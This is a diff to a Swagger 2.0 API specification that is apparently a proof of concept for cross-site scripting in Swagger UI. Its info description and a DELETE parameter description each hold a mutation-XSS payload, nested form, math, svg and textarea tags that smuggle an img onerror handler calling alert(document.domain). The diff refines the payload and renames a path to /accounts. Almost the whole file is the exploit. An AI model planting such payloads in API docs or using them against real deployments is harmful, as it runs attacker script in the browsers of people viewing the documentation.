@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation (POC Purpose Only to show that your DOM has been hijacked)
+  title: Classic API Resource Documentation (POC Purpose Only)
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("wow XSS just got triggered!") src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -15,7 +15,7 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /Totallyfakequest:
+  /accounts:
     get:
       responses:
         '200':
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("wow XSS just got triggered!") src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
           format: int64
           in: path
